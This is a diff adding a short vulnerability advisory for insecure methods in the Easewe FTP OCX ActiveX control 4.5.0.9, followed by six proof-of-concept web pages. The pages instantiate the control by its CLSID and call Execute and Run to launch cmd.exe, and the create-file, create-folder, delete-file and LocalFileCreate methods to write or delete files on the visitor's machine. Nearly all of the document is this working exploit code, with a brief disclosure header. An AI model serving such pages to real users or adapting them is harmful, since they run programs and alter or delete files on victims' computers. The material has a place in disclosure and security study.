@@ -1,0 +1,102 @@
+source: http://www.securityfocus.com/bid/48393/info
+
+Easewe FTP OCX ActiveX control is prone to multiple insecure-method vulnerabilities.
+
+Attackers can exploit these issues to perform unauthorized actions or execute arbitrary programs. Successful exploits may result in compromise of affected computers.
+
+Easewe FTP OCX ActiveX control 4.5.0.9 is vulnerable; other versions may also be affected. 
+
+1.
+<html>
+<object classid='clsid:31AE647D-11D1-4E6A-BE2D-90157640019A' id='target' /></object>
+<input language=VBScript onclick=Boom() type=button value="Exploit">
+<script language = 'vbscript'>
+Sub Boom()
+arg1="c:\windows\system32\cmd.exe"
+arg2=""
+arg3=1
+target.Execute arg1 ,arg2 ,arg3
+End Sub
+</script>
+</html>
+
+2.
+<html>
+<object classid='clsid:31AE647D-11D1-4E6A-BE2D-90157640019A' id='target' /></object>
+<input language=VBScript onclick=Boom() type=button value="Exploit">
+<script language = 'vbscript'>
+Sub Boom()
+arg1="c:\windows\system32\cmd.exe"
+arg2=""
+arg3=1
+target.Run arg1 ,arg2 ,arg3
+End Sub
+</script>
+</html>
+
+3.
+<html>
+<object classid='clsid:31AE647D-11D1-4E6A-BE2D-90157640019A' id='target' /></object>
+<input language=VBScript onclick=Boom() type=button value="Exploit">
+<script language = 'vbscript'>
+
+Sub Boom()
+arg1="FilePath\Filename_to_create"
+target.CreateLocalFile arg1
+End Sub
+
+</script>
+</html>
+
+4.
+<html>
+<object classid='clsid:31AE647D-11D1-4E6A-BE2D-90157640019A' id='target' /></object>
+<input language=VBScript onclick=Boom() type=button value="Exploit">
+<script language = 'vbscript'>
+
+Sub Boom()
+arg1="Directorypath\Directory"
+target.CreateLocalFolder arg1
+End Sub
+
+</script>
+</html>
+
+5.
+<html>
+<object classid='clsid:31AE647D-11D1-4E6A-BE2D-90157640019A' id='target' /></object>
+<input language=VBScript onclick=Boom() type=button value="Exploit">
+<script language = 'vbscript'>
+
+Sub Boom()
+arg1="FilePath\Filename_to_delete"
+target.DeleteLocalFile arg1
+End Sub
+</script>
+</html>
+
+<HTML>
+Easewe FTP(EaseWeFtp.ocx) Insecure Method Exploit<br>
+<br>
+Description There is Insecure Method in (LocalFileCreate) fonction<br>
+Found By : coolkaveh<br>
+
+<title>Exploited By : coolkaveh </title>
+<BODY>
+ <object id=cyber
+classid="clsid:{31AE647D-11D1-4E6A-BE2D-90157640019A}"></object>
+
+<SCRIPT>
+
+function Do_it()
+ {
+     File = "kaveh.txt"
+   cyber.LocalFileCreate(File)
+ }
+
+</SCRIPT>
+<input language=JavaScript onclick=Do_it() type=button value="Click
+here To Test"><br>
+</body>
+</HTML>
+
